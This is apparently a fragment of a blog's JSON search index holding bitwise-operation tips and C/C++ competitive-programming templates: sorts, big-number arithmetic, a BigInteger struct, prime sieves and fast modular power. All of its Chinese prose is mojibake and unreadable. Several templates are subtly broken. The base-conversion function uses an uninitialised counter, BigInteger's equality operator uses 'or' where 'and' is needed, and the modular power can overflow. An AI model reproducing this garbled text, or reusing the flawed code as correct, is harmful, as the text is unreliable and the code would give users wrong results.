çš„å‡åºé¡ºåºæšä¸¾å‡ºæ¥ã€‚ æ›´é«˜çº§çš„å†…å®¹å‚è§æŒ‘æˆ˜ç¨‹åºè®¾è®¡ç«èµ›ã€‚ å…¶å®æ˜¯æ‡’ ","date":"2018-03-11","objectID":"/bitwise-ops/:2:0","tags":["ä½è¿ç®—","C/C++"],"title":"ä½è¿ç®—ç”¨æ³•æ•´ç†","uri":"/bitwise-ops/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ä½è¿ç®—çš„å¸¸è§æŠ€å·§å’Œå¸¸ç”¨å…¬å¼ å¦‚æœ‰é—æ¼è¯·åŠ¡å¿…è¡¥å……ã€‚ ï¼ˆæ¥è‡ª: æ ‘çŠ¶æ•°ç»„ lowbitï¼‰å–å‡º â€œä» x çš„æœ€ä½ä½çš„ 1 ç›´åˆ°æœ€åâ€ çš„å€¼ï¼šx \u0026= -x ï¼ˆæ¥è‡ª: çº¿æ®µæ ‘ï¼‰å¿«é€Ÿæ±‚ $2x,2x+1$ï¼šx\u003c\u003c1, x\u003c\u003c1|1 ï¼ˆæ¥è‡ª: æˆ‘ä¹Ÿä¸çŸ¥é“æ¥è‡ªå“ªé‡Œï¼‰æŠŠ x æœ€ä½ä½çš„ 1 å˜æˆ 0ï¼šx \u0026= (x-1) ï¼ˆæ¥è‡ª: æˆ‘ä¹Ÿä¸çŸ¥é“æ¥è‡ªå“ªé‡Œï¼‰æŠŠ x æœ€ä½ä½çš„ 0 å˜æˆ 1ï¼šx |= x+1 ï¼ˆæ¥è‡ª: çŠ¶å‹ dpï¼‰åˆ¤æ–­ x çš„ç¬¬ i ä½æ˜¯ä¸æ˜¯ 1ï¼šif (x \u0026 (1\u003c\u003ci)) ï¼ˆæ¥è‡ª: åšå¼ˆè®ºï¼‰å¼‚æˆ–ï¼ˆXORï¼‰è¿ç®—çš„æ€§è´¨ï¼šåŒä¸€ä¸ªæ•°å¼‚æˆ–ä¸¤æ¬¡å³ä¸ºå…¶è‡ªèº« ï¼ˆæ¥è‡ªï¼šCSAPPï¼‰C/C++ ä¸­å¯¹äºæœ‰ç¬¦å·æ•°ï¼Œ\u003e\u003e è¡¨ç¤ºç®—æœ¯å³ç§»ï¼›å¯¹äºæ— ç¬¦å·æ•°ï¼Œ\u003e\u003e è¡¨ç¤ºé€»è¾‘å³ç§»ã€‚å¯¹äºä¸¤è€…è€Œè¨€ï¼Œ\u003c\u003c éƒ½è¡¨ç¤ºé€»è¾‘å·¦ç§»ã€‚ ï¼ˆæ¥è‡ª: ä¸ºäº†å·æ‡’ä¸å†™ EOFï¼‰è¡¨ç¤º x ä¸ç­‰äº -1ï¼š~xã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œwhile(scanf(\"%d\", \u0026n) != EOF) ç­‰ä»·äº while(~scanf(\"%d\", \u0026n))ã€‚ ç”±äºå…¶ä¸­åŸç†éƒ½ä¸éš¾æ¨å¯¼ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ ","date":"2018-03-11","objectID":"/bitwise-ops/:3:0","tags":["ä½è¿ç®—","C/C++"],"title":"ä½è¿ç®—ç”¨æ³•æ•´ç†","uri":"/bitwise-ops/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"gcc ä¸­ __builtin ç³»åˆ—å‡½æ•°åŠ C++ ä¸­ bitset ç±»çš„ç®€ä»‹ è¿™é‡Œåªè®°å½•ä¸€äº›å®è®­å¯èƒ½ä¼šç”¨åˆ°çš„â€¦â€¦ __builtin ä»¥ä¸‹å‡½æ•°éƒ½è¿”å› intï¼Œx éƒ½ä¸º unsigned intï¼ˆå½“ç„¶åœ¨å‡½æ•°åååŠ  l æˆ– ll å¯ä»¥æ”¹ä¸º long/long long ç±»å‹ï¼‰ã€‚ __builtin_popcount(x)ï¼šx ä¸­ 1 çš„ä¸ªæ•° __builtin_ctz(x)ï¼šx æœ«å°¾ 0 çš„ä¸ªæ•°ï¼ˆx é 0ï¼‰ __builtin_clz(x)ï¼šx å‰å¯¼ 0 çš„ä¸ªæ•°ï¼ˆx é 0ï¼‰ __builtin_ffs(x)ï¼šx ä¸­æœ€åä¸€ä¸ªä¸º 1 çš„ä½æ˜¯ä»åå‘å‰çš„ç¬¬å‡ ä½ __builtin_parity(x)ï¼šx ä¸­ 1 çš„ä¸ªæ•°æ¨¡ 2 çš„å€¼ bitset æœ¬æ¥æƒ³è‡ªå·±å†™ä¸€ä¸‹ï¼Œåæ¥å‘ç° è¿™ä¸ªåšå®¢ å’Œ è¿™ä¸ªåšå®¢ æ€»ç»“å¾—å¾ˆå¥½ï¼Œå°±å·äº†ä¸ªæ‡’ã€‚ ä¸€èˆ¬æ¥è¯´å®è®­å½“ä¸­ä¸å¤ªä¼šæœ‰å¾ˆéœ€è¦ç”¨åˆ° __builtin å’Œ bitset çš„é¢˜ç›®ï¼Œæ‰€ä»¥äº†è§£ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚ ","date":"2018-03-11","objectID":"/bitwise-ops/:4:0","tags":["ä½è¿ç®—","C/C++"],"title":"ä½è¿ç®—ç”¨æ³•æ•´ç†","uri":"/bitwise-ops/"},{"categories":["ç®—æ³•"],"content":"å…¶å®å·®ä¸å¤šå°±æ˜¯ä½éš¾åº¦ C++ æ¨¡æ¿é›†åˆã€‚ ","date":"2018-03-10","objectID":"/exam-prep/:0:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ’åº ","date":"2018-03-10","objectID":"/exam-prep/:1:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å¿«é€Ÿæ’åº void quick_sort(int s[], int l, int r) //(s[], 0, n-1) ascending order { int i, j, x; if (l \u003c r) { i = l; j = r; x = s[i]; while (i \u003c j) { while(i \u003c j \u0026\u0026 s[j] \u003e x) j--; if(i \u003c j) s[i++] = s[j]; while(i \u003c j \u0026\u0026 s[i] \u003cx) i++; if(i \u003c j) s[j--] = s[i]; } s[i] = x; quick_sort(s, l, i-1); quick_sort(s, i+1, r); } } ","date":"2018-03-10","objectID":"/exam-prep/:1:1","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"é€‰æ‹©æ’åº void sel_sort(int *num, int n) //ascending order { int i, j, min, tmp; for (i = 0;i \u003c n - 1; ++i){ min = i; for (j = i + 1; j \u003c n; ++j) if (num[min] \u003e num[j]) min = j; if (min != i){ tmp = num[min]; num[min] = num[i]; num[i] = tmp; } } } ","date":"2018-03-10","objectID":"/exam-prep/:1:2","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ’å…¥æ’åº void ins_sort(int *num, int n) //ascending order { int i, j; for (i = 1; i \u003c n; ++i){ for (j = 0; j \u003c i; ++j) if (num[j] \u003e num[i]){ int tmp = num[i], k; for (k = i; k\u003e j; --k) num[k] = num[k - 1]; num[j] = tmp; break; } } } ","date":"2018-03-10","objectID":"/exam-prep/:1:3","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å†’æ³¡æ’åº void bubble_sort(int *num, int n) // ascending order { int i, j; for (i = n - 1; i\u003e 0; --i){ for (j = 0; j \u003c i; ++j) if (num[j] \u003e num[j + 1]){ int tmp = num[j]; num[j] = num[j + 1]; num[j + 1] = tmp; } } } ","date":"2018-03-10","objectID":"/exam-prep/:1:4","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ¨è¾‰ä¸‰è§’ void tri(int m) { int i,j,a[30][30]={{0}}; for (i = 0; i \u003c m; i++) a[i][0] = 1; for (i = 1; i \u003c m; i++) for (j = 1; j \u003c= i; j++) a[i][j] = a[i-1][j-1] + a[i-1][j]; for (i = 0; i \u003c m; i++){ for (j = 0; j \u003c= i; j++){ if (j == i) printf(\"%d\", a[i][j]); else printf(\"%d\", a[i][j]); } printf(\"\\n\"); } } ","date":"2018-03-10","objectID":"/exam-prep/:2:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"åè¿›åˆ¶è½¬ R è¿›åˆ¶ void TentoR(int a, int b) //a(base 10) to number(base b) { int cnt,number[20]; if (a == 0) return; TentoR(a / b, b); number[cnt++] = a % b; } ","date":"2018-03-10","objectID":"/exam-prep/:3:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"äºŒåˆ†æŸ¥æ‰¾ int bin_search(int *a, int size, int p) //ascending order { int l = 0, r = size - 1; while (l \u003c= r){ int mid = l + (r - l) / 2; if (p == a[mid]) return mid; else if (p\u003e a[mid]) l = mid + 1; else r = mid - 1; } return -1; } ","date":"2018-03-10","objectID":"/exam-prep/:4:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å­—ç¬¦ä¸²åè½¬ void rev_str(char s[]) { int c,i,j; for (i = 0, j = strlen(s) - 1; i \u003cj; i++, j--){ c = s [i]; s[i] = s[j]; s[j] = c; } } ","date":"2018-03-10","objectID":"/exam-prep/:5:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æœ€å¤§å…¬çº¦æ•° long gcd(long a, long b) //lcm = a * b / gcd(a, b) { return b == 0 ? a : gcd(b, a % b); } ","date":"2018-03-10","objectID":"/exam-prep/:6:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"é«˜ç²¾åº¦ ","date":"2018-03-10","objectID":"/exam-prep/:7:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"åŠ æ³•ï¼ˆéè´Ÿï¼‰ inline string add(string s1, string s2) { string s; int len1 = s1.size(), len2 = s2.size(); if (len1 \u003c len2) for (int i = 1; i \u003c= len2-len1; ++i) s1 = \"0\" + s1; else for (int i = 1; i \u003c= len1-len2; ++i) s2 = \"0\" + s2; len1 = s1.size(); int plus = 0, tmp; for (int i = len1-1; i\u003e= 0; --i) { tmp = s1[i]-'0' + s2[i]-'0' + plus; plus = tmp / 10; tmp %= 10; s = char(tmp+'0') + s; } if (plus) s = char(plus+'0') + s; return s; } ","date":"2018-03-10","objectID":"/exam-prep/:7:1","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å‡æ³• inline int cmp(const string\u0026 s1, const string\u0026 s2) { if (s1.size() \u003e s2.size()) return 1; else if (s1.size() \u003cs2.size()) return -1; else return s1.compare(s2); } inline string subtract(string s1, string s2) { string s; if (!cmp(s1, s2)) return \"0\"; if (cmp(s1, s2) \u003c0) {putchar('-'); swap(s1, s2);} int tmp = s1.size() - s2.size(), minus = 0; for (int i = s2.size()-1; i \u003e= 0; --i) { if (s1[i+tmp] \u003cs2[i]+minus) { s = char(s1[i+tmp] - s2[i] - minus + '0'+10) + s; minus = 1; } else { s = char(s1[i+tmp] - s2[i] - minus + '0') + s; minus = 0; } } for (int i = tmp-1; i\u003e= 0; --i) { if (s1[i] - minus \u003e= '0') { s = char(s1[i]-minus) + s; minus = 0; } else { s = char(s1[i] - minus + 10) + s; minus = 1; } } s.erase(0, s.find_first_not_of('0')); return s; } ","date":"2018-03-10","objectID":"/exam-prep/:7:2","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"ä¹˜æ³•ï¼ˆéè´Ÿï¼Œéœ€è¦å‰é¢çš„ add) inline string mul(string s1, string s2) { string s, stmp; int len1 = s1.size(), len2 = s2.size(); for (int i = len2-1; i\u003e= 0; --i) { stmp = \"\"; int tmp = s2[i]-'0', plus = 0, t = 0; if (tmp) { for (int j = 1; j \u003c= len2-i-1; ++j) stmp += \"0\"; for (int j = len1-1; j\u003e= 0; --j) { t = (tmp*(s1[j]-'0') + plus) % 10; plus = (tmp*(s1[j]-'0') + plus) / 10; stmp = char(t+'0') + stmp; } if (plus) stmp = char(plus+'0') + stmp; } s = add(s, stmp); } s.erase(0, s.find_first_not_of('0')); if (s.empty()) s = \"0\"; return s; } ","date":"2018-03-10","objectID":"/exam-prep/:7:3","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"é˜¶ä¹˜ void fact(int n) { int result[10005]; memset(result, 0, sizeof(result)); result[0] = 1; for (int i = 2; i \u003c= n; ++i) { int left = 0; for (int j = 0; j \u003c 10000; ++j) { result[j] = left + result[j] * i; left = result[j] / 10; result[j] %= 10; } } int k = 9999; while (!result[k]) k--; for (int i = k; i\u003e= 0; --i) printf(\"%d\", result[i]); printf(\"\\n\"); } ","date":"2018-03-10","objectID":"/exam-prep/:7:4","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"é™¤æ³•ï¼ˆéè´Ÿï¼Œéœ€è¦å‰é¢çš„ subtract å’Œ mul ä¸”é™¤æ•°ä¸èƒ½ä¸º 0ï¼‰ inline void div(string s1, string s2, string\u0026 quot, string\u0026 rem) { quot = rem = \"\"; if (s1 ==\"0\") { quot = rem = \"0\"; return; } int comp = cmp(s1, s2); if (comp \u003c 0) { quot = \"0\"; rem = s1; return; }else if (!comp) { quot = \"1\"; rem = \"0\"; return; } else { int len1 = s1.size(), len2 = s2.size(); string stmp; stmp.append(s1, 0, len2-1); for (int i = len2-1; i \u003c len1; ++i) { stmp += s1[i]; stmp.erase(0, stmp.find_first_not_of('0')); if (stmp.empty()) stmp = \"0\"; for (char c ='9'; c\u003e= '0'; --c) { string s, tmp; s += c; tmp = mul(s2, s); if (cmp(tmp, stmp) \u003c= 0) { quot += c; stmp = subtract(stmp, tmp); break; } } } rem = stmp; } quot.erase(0, quot.find_first_not_of('0')); if (quot.empty()) quot = \"0\"; } ","date":"2018-03-10","objectID":"/exam-prep/:7:5","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å¤§æ•´æ•°ç±» struct BigInteger { static const int BASE = 1e8; static const int WIDTH = 8; vector\u003cint\u003e s; BigInteger(long long num = 0) {*this = num;} BigInteger operator = (long long); BigInteger operator = (const string\u0026); BigInteger operator + (const BigInteger\u0026) const; BigInteger operator - (const BigInteger\u0026) const; BigInteger operator * (const BigInteger\u0026) const; BigInteger operator / (const BigInteger\u0026) const; BigInteger operator += (const BigInteger\u0026); BigInteger operator -= (const BigInteger\u0026); BigInteger operator *= (const BigInteger\u0026); BigInteger operator /= (const BigInteger\u0026); bool operator \u003c(const BigInteger\u0026) const; bool operator \u003e (const BigInteger\u0026) const; bool operator \u003c= (const BigInteger\u0026) const; bool operator \u003e= (const BigInteger\u0026) const; bool operator != (const BigInteger\u0026) const; bool operator == (const BigInteger\u0026) const; }; BigInteger BigInteger::operator = (long long num) // é‡è½½ = è¿ç®—ç¬¦ (æ•°å­—èµ‹å€¼) { s.clear(); do { s.push_back(num%BASE); num /= BASE; }while (num\u003e 0); return *this; } BigInteger BigInteger::operator = (const string\u0026 str) // é‡è½½ = è¿ç®—ç¬¦ (å­—ç¬¦ä¸²èµ‹å€¼) { s.clear(); int x, len = (str.length() - 1) / WIDTH + 1; for (int i = 0; i \u003c len; ++i) { int end = str.length() - i * WIDTH; int start = max(0, end-WIDTH); sscanf(str.substr(start, end-start).c_str(),\"%d\", \u0026x); s.push_back(x); } return *this; } BigInteger BigInteger::operator + (const BigInteger\u0026 b) const // é‡è½½ + è¿ç®—ç¬¦ { BigInteger c; c.s.clear(); for (int i = 0, g = 0; ; ++i) { if (!g \u0026\u0026 i\u003e= s.size() \u0026\u0026 i\u003e= b.s.size()) break; int x = g; if (i \u003c s.size()) x += s[i]; if (i \u003c b.s.size()) x += b.s[i]; c.s.push_back(x%BASE); g = x / BASE; } return c; } BigInteger BigInteger::operator += (const BigInteger\u0026 b) // é‡è½½ += è¿ç®—ç¬¦ { *this = *this + b; return *this; } bool BigInteger::operator \u003c(const BigInteger\u0026 b) const // é‡è½½ \u003c è¿ç®—ç¬¦ { if (s.size() != b.s.size()) return s.size() \u003c b.s.size(); for (int i = s.size()-1; i \u003e= 0; --i) if (s[i] != b.s[i]) return s[i] \u003cb.s[i]; return false; } bool BigInteger::operator \u003e (const BigInteger\u0026 b) const // é‡è½½ \u003e è¿ç®—ç¬¦ { return b \u003c *this; } bool BigInteger::operator \u003c= (const BigInteger\u0026 b) const // é‡è½½ \u003c= è¿ç®—ç¬¦ { return !(b \u003c *this); } bool BigInteger::operator \u003e= (const BigInteger\u0026 b) const // é‡è½½ \u003e= è¿ç®—ç¬¦ { return !(*this \u003c b); } bool BigInteger::operator != (const BigInteger\u0026 b) const // é‡è½½!= è¿ç®—ç¬¦ { return b \u003c *this || *this \u003c b; } bool BigInteger::operator == (const BigInteger\u0026 b) const // é‡è½½ == è¿ç®—ç¬¦ { return !(b \u003c *this) || !(*this \u003c b); } ostream\u0026 operator \u003c\u003c(ostream\u0026 out, const BigInteger\u0026 x) // é‡è½½ \u003c\u003c è¿ç®—ç¬¦ { out \u003c\u003cx.s.back(); for (int i = x.s.size()-2; i \u003e= 0; --i) { char buf[20]; sprintf(buf,\"%08d\", x.s[i]); for (int j = 0; j \u003c strlen(buf); ++j) out \u003c\u003cbuf[j]; } return out; } istream\u0026 operator \u003e\u003e (istream\u0026 in, BigInteger\u0026 x) // é‡è½½ \u003e\u003e è¿ç®—ç¬¦ { string s; if (!(in\u003e\u003e s)) return in; x = s; return in; } ","date":"2018-03-10","objectID":"/exam-prep/:8:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å¿«é€Ÿå¹‚å–æ¨¡ typedef long long ll; ll pow_mod(int a, int b, int p) { ll ret = 1; while (b) { if (b\u00261) ret = (ret * a) % p; a = (a * a) % p; b \u003e\u003e= 1; } return ret; } ","date":"2018-03-10","objectID":"/exam-prep/:9:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ‰©å±•æ¬§å‡ é‡Œå¾— int extgcd(int a, int b, int \u0026x, int \u0026y) { if (!b) { x = 1; y = 0; return a; } int d = extgcd(b, a % b, x, y); int t = x; x = y; y = t - a / b * y; return d; } ","date":"2018-03-10","objectID":"/exam-prep/:10:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"ç´ æ•°ç›¸å…³ ","date":"2018-03-10","objectID":"/exam-prep/:11:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ¬§æ‹‰ç­› // æ¬§æ‹‰ç­› const int maxn = 1e7+5; bool np[maxn]{true,true}; vector\u003cint\u003e prime; int main() { int n, m, x; cin \u003e\u003e n \u003e\u003e m; for (int i = 2; i \u003c= n; ++i) { if (!np[i]) prime.push_back(i); for (int j = 0; j \u003c prime.size() \u0026\u0026 i*prime[j] \u003c= n; ++j) { np[i*prime[j]] = true; if (i % prime[j] == 0) break; } } for (int i = 1; i \u003c= m; ++i) { scanf(\"%d\", \u0026x); printf(\"%s\\n\", np[x] ? \"No\" : \"Yes\"); } return 0; } ","date":"2018-03-10","objectID":"/exam-prep/:11:1","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"åŸƒæ°ç­› const int maxn = 1e6+5; bool np[maxn]{true, true}; void init() { for (int i = 2; i \u003c maxn; i++) if (!np[i]) { if (i\u003e maxn/i) continue; // æˆ–ç”¨ ll çœå»è¿™ä¸€æ­¥ for (int j = i*i; j \u003c maxn; j += i) np[j] = true; } } ","date":"2018-03-10","objectID":"/exam-prep/:11:2","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å•ç‹¬åˆ¤æ–­ï¼ˆsqrt(n)ï¼‰ typedef long long ll; inline bool isprime(ll m) { for (ll i = 2; i * i \u003c= m; ++i) if (!(m % i)) return false; return true; } ","date":"2018-03-10","objectID":"/exam-prep/:11:3","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"åŒºé—´ç­› typedef long long ll; const int maxn = 1e6+5; ll a, b; bool isp[maxn], ispsmall[maxn]; void seg_sieve() { for (ll i = 2; i*i \u003c= b; ++i) ispsmall[i] = true; for (ll i = 0; i \u003c= b-a; ++i) isp[i] = true; for (ll i = 2; i*i \u003c= b; ++i) if (ispsmall[i]) { for (ll j = (i\u003c\u003c1); j*j \u003c= b; j += i) ispsmall[j] = false; for (ll j = max(2LL, (a+i-1)/i) * i; j \u003c= b; j += i) isp[j-a] = false; } if (a \u003c= 1) isp[1-a] = false; bool flag = false; for (ll i = 0; i \u003c= b-a; ++i) if (isp[i]) { if (flag) printf(\" %lld\", i+a); else flag = true, printf(\"%lld\", i+a); } flag ? puts(\"\") : puts(\"no prime number.\"); } ","date":"2018-03-10","objectID":"/exam-prep/:11:4","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"çº¦ç‘Ÿå¤« int n, m; vector\u003cint\u003e v; int main() { cin \u003e\u003e n \u003e\u003e m; if (!n \u0026\u0026 !m) return 0; for (int i = 1; i \u003c= n; ++i) v.push_back(i); int kill = 0; while (v.size() \u003e 1) { kill = (kill+m-1) % v.size(); printf(\"%d\", v[kill]); v.erase(v.begin()+kill); } printf(\"%d\\n\", v[0]); return 0; } 